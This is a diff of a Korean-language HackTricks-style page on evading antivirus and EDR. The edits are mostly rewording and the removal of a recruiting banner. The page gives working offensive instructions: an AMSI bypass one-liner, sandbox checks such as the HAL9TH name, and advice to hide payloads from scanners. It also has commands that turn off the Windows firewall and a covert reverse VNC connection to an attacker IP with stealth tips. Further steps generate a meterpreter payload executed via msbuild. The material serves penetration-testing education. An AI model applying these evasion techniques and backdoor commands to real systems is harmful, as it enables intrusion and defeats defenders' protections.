@@ -2,12 +2,6 @@
 
 {{#include ../banners/hacktricks-training.md}}
 
-<figure><img src="../images/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
-
-해킹 경력에 관심이 있고 해킹할 수 없는 것을 해킹하고 싶다면 - **우리는 인재를 모집합니다!** (_유창한 폴란드어 필기 및 구사 필수_).
-
-{% embed url="https://www.stmcyber.com/careers" %}
-
 **이 페이지는** [**@m2rc_p**](https://twitter.com/m2rc_p)**에 의해 작성되었습니다!**
 
 ## **AV 회피 방법론**
@@ -16,55 +10,55 @@
 
 ### **정적 탐지**
 
-정적 탐지는 이진 파일이나 스크립트에서 알려진 악성 문자열이나 바이트 배열을 플래그 지정하고 파일 자체에서 정보를 추출하여 달성됩니다(예: 파일 설명, 회사 이름, 디지털 서명, 아이콘, 체크섬 등). 이는 알려진 공개 도구를 사용하면 더 쉽게 적발될 수 있음을 의미합니다. 왜냐하면 이러한 도구는 아마도 분석되어 악성으로 플래그가 지정되었기 때문입니다. 이러한 종류의 탐지를 우회하는 방법은 몇 가지가 있습니다:
+정적 탐지는 이진 파일이나 스크립트에서 알려진 악성 문자열이나 바이트 배열을 플래그 지정하고 파일 자체에서 정보를 추출하여 달성됩니다(예: 파일 설명, 회사 이름, 디지털 서명, 아이콘, 체크섬 등). 이는 알려진 공개 도구를 사용하면 더 쉽게 적발될 수 있음을 의미합니다. 왜냐하면 이러한 도구는 아마도 분석되어 악성으로 플래그가 지정되었기 때문입니다. 이러한 종류의 탐지를 우회하는 몇 가지 방법이 있습니다:
 
 - **암호화**
 
-이진 파일을 암호화하면 AV가 프로그램을 탐지할 방법이 없지만, 메모리에서 프로그램을 복호화하고 실행하기 위한 로더가 필요합니다.
+이진 파일을 암호화하면 AV가 프로그램을 탐지할 방법이 없지만, 메모리에서 프로그램을 복호화하고 실행할 로더가 필요합니다.
 
 - **난독화**
 
 때때로 이진 파일이나 스크립트의 일부 문자열을 변경하는 것만으로 AV를 통과할 수 있지만, 이는 난독화하려는 내용에 따라 시간이 많이 소요될 수 있습니다.
 
-- **맞춤형 도구**
+- **커스텀 도구**
 
 자신만의 도구를 개발하면 알려진 악성 서명이 없지만, 이는 많은 시간과 노력이 필요합니다.
 
 > [!NOTE]
 > Windows Defender의 정적 탐지에 대한 좋은 확인 방법은 [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck)입니다. 이 도구는 파일을 여러 세그먼트로 나눈 다음 Defender에게 각 세그먼트를 개별적으로 스캔하도록 요청합니다. 이렇게 하면 이진 파일에서 플래그가 지정된 문자열이나 바이트가 무엇인지 정확히 알 수 있습니다.
 
-이 [YouTube 재생목록](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf)을 확인하는 것을 강력히 추천합니다. 실용적인 AV 회피에 대한 내용입니다.
+실용적인 AV 회피에 대한 이 [YouTube 재생목록](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf)을 확인하는 것을 강력히 추천합니다.
 
 ### **동적 분석**
 
 동적 분석은 AV가 이진 파일을 샌드박스에서 실행하고 악성 활동을 감시하는 것입니다(예: 브라우저의 비밀번호를 복호화하고 읽으려 하거나, LSASS에서 미니 덤프를 수행하는 등). 이 부분은 다루기가 조금 더 까다로울 수 있지만, 샌드박스를 회피하기 위해 할 수 있는 몇 가지 방법이 있습니다.
 
 - **실행 전 대기** 구현 방식에 따라 AV의 동적 분석을 우회하는 좋은 방법이 될 수 있습니다. AV는 사용자의 작업 흐름을 방해하지 않기 위해 파일을 스캔할 시간이 매우 짧기 때문에 긴 대기를 사용하면 이진 파일 분석을 방해할 수 있습니다. 문제는 많은 AV의 샌드박스가 구현 방식에 따라 대기를 건너뛸 수 있다는 것입니다.
-- **컴퓨터 자원 확인** 일반적으로 샌드박스는 작업할 수 있는 자원이 매우 적습니다(예: < 2GB RAM), 그렇지 않으면 사용자의 컴퓨터를 느리게 만들 수 있습니다. 여기서 매우 창의적으로 접근할 수 있습니다. 예를 들어 CPU의 온도나 팬 속도를 확인하는 것과 같이 샌드박스에 구현되지 않은 것들이 많습니다.
+- **컴퓨터 자원 확인** 일반적으로 샌드박스는 작업할 수 있는 자원이 매우 적습니다(예: < 2GB RAM). 그렇지 않으면 사용자의 컴퓨터를 느리게 만들 수 있습니다. 여기서 매우 창의적으로 접근할 수 있습니다. 예를 들어 CPU의 온도나 팬 속도를 확인하는 것과 같이 샌드박스에 구현되지 않은 것들이 많습니다.
 - **기계 특정 검사** "contoso.local" 도메인에 가입된 사용자를 타겟으로 하려면 컴퓨터의 도메인을 확인하여 지정한 도메인과 일치하는지 확인할 수 있습니다. 일치하지 않으면 프로그램을 종료할 수 있습니다.
 
 Microsoft Defender의 샌드박스 컴퓨터 이름은 HAL9TH이므로, 폭발 전에 악성코드에서 컴퓨터 이름을 확인할 수 있습니다. 이름이 HAL9TH와 일치하면 Defender의 샌드박스 안에 있다는 의미이므로 프로그램을 종료할 수 있습니다.
 
 <figure><img src="../images/image (209).png" alt=""><figcaption><p>출처: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>
 
-샌드박스에 대항하기 위한 [@mgeeky](https://twitter.com/mariuszbit)의 다른 유용한 팁
+샌드박스에 대항하기 위한 [@mgeeky](https://twitter.com/mariuszbit)의 몇 가지 좋은 팁
 
 <figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev 채널</p></figcaption></figure>
 
-앞서 이 게시물에서 언급했듯이, **공식 도구**는 결국 **탐지됩니다**, 따라서 스스로에게 질문해야 합니다:
+이 게시물에서 이전에 언급했듯이, **공식 도구**는 결국 **탐지됩니다**, 따라서 스스로에게 질문해야 합니다:
 
 예를 들어, LSASS를 덤프하려면 **정말로 mimikatz를 사용해야 하나요**? 아니면 덜 알려진 다른 프로젝트를 사용하여 LSASS를 덤프할 수 있을까요?
 
 정답은 아마 후자일 것입니다. mimikatz를 예로 들면, 아마도 AV와 EDR에 의해 가장 많이 플래그가 지정된 악성코드 중 하나일 것입니다. 프로젝트 자체는 매우 멋지지만, AV를 우회하기 위해 작업하는 것은 악몽과도 같습니다. 따라서 달성하려는 목표에 대한 대안을 찾아보세요.
 
 > [!NOTE]
-> 회피를 위해 페이로드를 수정할 때는 Defender에서 **자동 샘플 제출을 끄는 것**을 잊지 마세요. 그리고 제발, 진지하게, **VIRUSTOTAL에 업로드하지 마세요**. 장기적으로 회피를 달성하는 것이 목표라면 말입니다. 특정 AV에서 페이로드가 탐지되는지 확인하고 싶다면 VM에 설치하고 자동 샘플 제출을 끄고 결과에 만족할 때까지 테스트하세요.
+> 회피를 위해 페이로드를 수정할 때는 Defender에서 **자동 샘플 제출을 끄는 것**을 잊지 마세요. 그리고 제발, 진지하게, **VIRUSTOTAL에 업로드하지 마세요**. 장기적으로 회피를 달성하는 것이 목표라면 말이죠. 특정 AV에서 페이로드가 탐지되는지 확인하고 싶다면 VM에 설치하고 자동 샘플 제출을 끄고 결과에 만족할 때까지 테스트하세요.
 
 ## EXE와 DLL
 
 가능할 때마다 **회피를 위해 DLL 사용을 우선시하세요**. 제 경험상 DLL 파일은 일반적으로 **탐지 및 분석이 훨씬 덜** 되므로, 경우에 따라 탐지를 피하기 위한 매우 간단한 트릭입니다(물론 페이로드가 DLL로 실행될 수 있는 방법이 있어야 합니다).
 
-이 이미지에서 볼 수 있듯이, Havoc의 DLL 페이로드는 antiscan.me에서 4/26의 탐지율을 보이는 반면, EXE 페이로드는 7/26의 탐지율을 보입니다.
+이 이미지에서 볼 수 있듯이, Havoc의 DLL 페이로드는 antiscan.me에서 4/26의 탐지율을 가지며, EXE 페이로드는 7/26의 탐지율을 가집니다.
 
 <figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me에서 일반 Havoc EXE 페이로드와 일반 Havoc DLL의 비교</p></figcaption></figure>
 
@@ -133,7 +127,7 @@ Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freez
 
 ## AMSI (안티 맬웨어 스캔 인터페이스)
 
-AMSI는 "[파일리스 맬웨어](https://en.wikipedia.org/wiki/Fileless_malware)"를 방지하기 위해 만들어졌습니다. 처음에 AV는 **디스크의 파일**만 스캔할 수 있었기 때문에, 만약 어떤 방법으로든 **메모리에서 직접 페이로드를 실행**할 수 있다면, AV는 이를 방지할 수 있는 충분한 가시성이 없었습니다.
+AMSI는 "[파일 없는 맬웨어](https://en.wikipedia.org/wiki/Fileless_malware)"를 방지하기 위해 만들어졌습니다. 처음에 AV는 **디스크의 파일**만 스캔할 수 있었기 때문에, 만약 어떤 방법으로든 **메모리에서 직접 페이로드를 실행**할 수 있다면, AV는 이를 방지할 수 있는 충분한 가시성이 없었습니다.
 
 AMSI 기능은 Windows의 다음 구성 요소에 통합되어 있습니다.
 
@@ -159,7 +153,7 @@ AMSI를 우회하는 방법은 몇 가지가 있습니다:
 
 AMSI는 주로 정적 감지와 함께 작동하므로, 로드하려는 스크립트를 수정하는 것이 감지를 회피하는 좋은 방법이 될 수 있습니다.
 
-그러나 AMSI는 여러 레이어가 있더라도 스크립트를 난독화 해제할 수 있는 기능이 있으므로, 난독화가 어떻게 이루어졌는지에 따라 나쁜 선택이 될 수 있습니다. 이는 회피를 간단하지 않게 만듭니다. 하지만 때때로, 변수 이름 몇 개만 변경하면 괜찮아지므로, 얼마나 많은 것이 플래그가 되었는지에 따라 다릅니다.
+그러나 AMSI는 여러 레이어가 있더라도 스크립트를 난독화 해제할 수 있는 기능이 있으므로, 난독화가 어떻게 이루어졌는지에 따라 나쁜 선택이 될 수 있습니다. 이는 회피를 간단하지 않게 만듭니다. 하지만 때때로, 변수 이름 몇 개만 변경하면 괜찮아지므로, 얼마나 많은 것이 플래그가 지정되었는지에 따라 다릅니다.
 
 - **AMSI 우회**
 
@@ -167,7 +161,7 @@ AMSI는 powershell (또는 cscript.exe, wscript.exe 등) 프로세스에 DLL을 
 
 **오류 강제 발생**
 
-AMSI 초기화를 실패하도록 강제하면 (amsiInitFailed) 현재 프로세스에 대한 스캔이 시작되지 않습니다. 원래 이는 [Matt Graeber](https://twitter.com/mattifestation)에 의해 공개되었으며, Microsoft는 더 넓은 사용을 방지하기 위해 서명을 개발했습니다.
+AMSI 초기화를 실패하게 강제하면 (amsiInitFailed) 현재 프로세스에 대한 스캔이 시작되지 않습니다. 원래 이는 [Matt Graeber](https://twitter.com/mattifestation)에 의해 공개되었으며, Microsoft는 더 넓은 사용을 방지하기 위해 서명을 개발했습니다.
 ```powershell
 [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
 ```
@@ -196,7 +190,7 @@ $Spotfix.SetValue($null,$true)
 > [!NOTE]
 > 더 자세한 설명은 [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/)를 읽어보세요.
 
-PowerShell을 사용하여 AMSI를 우회하는 데 사용되는 다른 많은 기술도 있습니다. [**이 페이지**](basic-powershell-for-pentesters/#amsi-bypass)와 [이 레포지토리](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell)를 확인하여 더 많은 정보를 알아보세요.
+PowerShell을 사용하여 AMSI를 우회하는 데 사용되는 다른 많은 기술이 있으며, [**이 페이지**](basic-powershell-for-pentesters/#amsi-bypass)와 [이 레포지토리](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell)를 확인하여 더 많은 정보를 알아보세요.
 
 또는 메모리 패칭을 통해 각 새로운 PowerShell을 패치하는 이 스크립트가 있습니다.
 
@@ -265,21 +259,21 @@ Here is a demo for bypassing SmartScreen by packaging payloads inside ISO files 
 
 ## C# Assembly Reflection
 
-C# 바이너리를 메모리에 로드하는 것은 꽤 오랜 시간 동안 알려져 있으며, AV에 걸리지 않고 포스트 익스플로잇 도구를 실행하는 매우 좋은 방법입니다.
+C# 바이너리를 메모리에 로드하는 것은 꽤 오랫동안 알려져 있으며, AV에 걸리지 않고 포스트 익스플로잇 도구를 실행하는 매우 좋은 방법입니다.
 
-페이로드가 디스크를 건드리지 않고 메모리에 직접 로드되기 때문에, 전체 프로세스에 대해 AMSI 패치에 대해서만 걱정하면 됩니다.
+페이로드가 디스크를 건드리지 않고 메모리에 직접 로드되기 때문에, 전체 프로세스에 대해 AMSI 패치를 걱정해야 합니다.
 
 대부분의 C2 프레임워크(슬리버, 코버넌트, 메타스플로잇, 코발트스트라이크, 하복 등)는 이미 메모리에서 C# 어셈블리를 직접 실행할 수 있는 기능을 제공하지만, 이를 수행하는 방법은 여러 가지가 있습니다:
 
 - **Fork\&Run**
 
-이는 **새로운 희생 프로세스를 생성**하고, 그 새로운 프로세스에 포스트 익스플로잇 악성 코드를 주입하여 악성 코드를 실행하고, 완료되면 새로운 프로세스를 종료하는 것을 포함합니다. 이 방법은 장점과 단점이 모두 있습니다. Fork and run 방법의 장점은 실행이 **우리의 비콘 임플란트 프로세스 외부**에서 발생한다는 것입니다. 이는 포스트 익스플로잇 작업에서 문제가 발생하거나 잡히면 **임플란트가 살아남을 가능성이 훨씬 더 높습니다.** 단점은 **행동 탐지**에 의해 잡힐 가능성이 **더 높아진다는** 것입니다.
+이는 **새로운 희생 프로세스를 생성**하고, 그 새로운 프로세스에 포스트 익스플로잇 악성 코드를 주입한 후, 악성 코드를 실행하고 완료되면 새로운 프로세스를 종료하는 것을 포함합니다. 이 방법은 장점과 단점이 모두 있습니다. Fork and run 방법의 장점은 실행이 **우리의 비콘 임플란트 프로세스 외부**에서 발생한다는 것입니다. 이는 포스트 익스플로잇 작업에서 문제가 발생하거나 잡히더라도 **임플란트가 생존할 가능성이 훨씬 더 높습니다.** 단점은 **행동 탐지**에 의해 잡힐 가능성이 **더 높아진다는** 것입니다.
 
 <figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>
 
 - **Inline**
 
-이는 포스트 익스플로잇 악성 코드를 **자신의 프로세스에 주입하는 것**입니다. 이렇게 하면 새로운 프로세스를 생성하고 AV에 의해 스캔되는 것을 피할 수 있지만, 단점은 페이로드 실행에 문제가 생기면 **비콘을 잃을 가능성이 훨씬 더 높아진다는** 것입니다. 
+이는 포스트 익스플로잇 악성 코드를 **자신의 프로세스에 주입하는 것**입니다. 이렇게 하면 새로운 프로세스를 생성하고 AV에 의해 스캔되는 것을 피할 수 있지만, 단점은 페이로드 실행 중 문제가 발생하면 **비콘을 잃을 가능성이 훨씬 더 높아진다는** 것입니다. 
 
 <figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>
 
@@ -294,7 +288,7 @@ C# 바이너리를 메모리에 로드하는 것은 꽤 오랜 시간 동안 알
 
 SMB 공유에서 인터프리터 바이너리와 환경에 대한 접근을 허용함으로써, 손상된 머신의 **메모리 내에서 이러한 언어로 임의의 코드를 실행할 수 있습니다.**
 
-레포지토리는 다음과 같이 언급합니다: Defender는 여전히 스크립트를 스캔하지만 Go, Java, PHP 등을 활용함으로써 **정적 서명을 우회할 수 있는 더 많은 유연성을 갖습니다.** 이러한 언어로 무작위로 난독화되지 않은 리버스 셸 스크립트로 테스트한 결과 성공적이었습니다.
+레포는 다음과 같이 언급합니다: Defender는 여전히 스크립트를 스캔하지만 Go, Java, PHP 등을 활용함으로써 **정적 서명을 우회할 수 있는 더 많은 유연성을 갖습니다.** 이러한 언어로 무작위로 난독화되지 않은 리버스 셸 스크립트로 테스트한 결과 성공적이었습니다.
 
 ## Advanced Evasion
 
@@ -315,11 +309,11 @@ SMB 공유에서 인터프리터 바이너리와 환경에 대한 접근을 허�
 ### **Check which parts Defender finds as malicious**
 
 [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck)를 사용하여 **바이너리의 일부를 제거**하여 **Defender가 악성으로 찾는 부분을 알아내고** 이를 분리할 수 있습니다.\
-또한 **같은 작업을 수행하는 도구는** [**avred**](https://github.com/dobin/avred)로, [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)에서 서비스를 제공하는 오픈 웹이 있습니다.
+또한 [**avred**](https://github.com/dobin/avred)라는 도구도 **같은 작업을 수행하며**, [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)에서 서비스를 제공하는 오픈 웹이 있습니다.
 
 ### **Telnet Server**
 
-Windows 10까지 모든 Windows에는 **Telnet 서버**가 포함되어 있었으며, 이를 설치할 수 있었습니다(관리자로서):
+Windows 10까지 모든 Windows에는 **Telnet 서버**가 포함되어 있었으며, 이를 설치할 수 있었습니다(관리자로).
 ```bash
 pkgmgr /iu:"TelnetServer" /quiet
 ```
@@ -334,7 +328,7 @@ netsh advfirewall set allprofiles state off
 ```
 ### UltraVNC
 
-Download it from: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (설치 파일이 아닌 bin 다운로드를 원합니다)
+다운로드: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (설치 파일이 아닌 bin 다운로드를 원합니다)
 
 **호스트에서**: _**winvnc.exe**_를 실행하고 서버를 구성합니다:
 
@@ -346,17 +340,17 @@ Download it from: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.
 
 #### **역방향 연결**
 
-**공격자**는 **호스트** 내에서 이진 파일 `vncviewer.exe -listen 5900`를 **실행**하여 역방향 **VNC 연결**을 받을 준비를 해야 합니다. 그런 다음, **희생자** 내에서: winvnc 데몬 `winvnc.exe -run`을 시작하고 `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`을 실행합니다
+**공격자**는 **호스트** 내에서 이진 파일 `vncviewer.exe -listen 5900`를 **실행**하여 역방향 **VNC 연결**을 수신할 준비를 해야 합니다. 그런 다음, **희생자** 내에서: winvnc 데몬을 시작합니다 `winvnc.exe -run` 및 `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`를 실행합니다
 
 **경고:** 은폐를 유지하기 위해 몇 가지를 하지 않아야 합니다
 
 - `winvnc`가 이미 실행 중이라면 시작하지 마세요. 그렇지 않으면 [팝업](https://i.imgur.com/1SROTTl.png)이 발생합니다. `tasklist | findstr winvnc`로 실행 중인지 확인하세요
-- 동일한 디렉토리에 `UltraVNC.ini`가 없으면 `winvnc`를 시작하지 마세요. 그렇지 않으면 [설정 창](https://i.imgur.com/rfMQWcf.png)이 열립니다
+- 동일한 디렉토리에 `UltraVNC.ini` 없이 `winvnc`를 시작하지 마세요. 그렇지 않으면 [설정 창](https://i.imgur.com/rfMQWcf.png)이 열립니다
 - 도움을 위해 `winvnc -h`를 실행하지 마세요. 그렇지 않으면 [팝업](https://i.imgur.com/oc18wcu.png)이 발생합니다
 
 ### GreatSCT
 
-Download it from: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
+다운로드: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
 ```
 git clone https://github.com/GreatSCT/GreatSCT.git
 cd GreatSCT/setup/
@@ -374,11 +368,11 @@ sel lport 4444
 generate #payload is the default name
 #This will generate a meterpreter xml and a rcc file for msfconsole
 ```
-이제 **리스터를 시작**하려면 `msfconsole -r file.rc`를 입력하고 **xml 페이로드를 실행**하려면:
+이제 **리스터를 시작**하려면 `msfconsole -r file.rc`를 사용하고 **xml 페이로드를 실행**하려면:
 ```
 C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
 ```
-**현재 방어자는 프로세스를 매우 빠르게 종료합니다.**
+**현재 방어자는 프로세스를 매우 빠르게 종료할 것입니다.**
 
 ### 자체 리버스 셸 컴파일하기
 
@@ -529,10 +523,5 @@ https://github.com/praetorian-code/vulcan
 
 - [https://github.com/persianhydra/Xeexe-TopAntivirusEvasion](https://github.com/persianhydra/Xeexe-TopAntivirusEvasion)
 
-<figure><img src="../images/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
-
-**해킹 경력**에 관심이 있고 해킹할 수 없는 것을 해킹하고 싶다면 - **우리는 인재를 모집합니다!** (_유창한 폴란드어 필기 및 구사 필수_).
-
-{% embed url="https://www.stmcyber.com/careers" %}
 
 {{#include ../banners/hacktricks-training.md}}
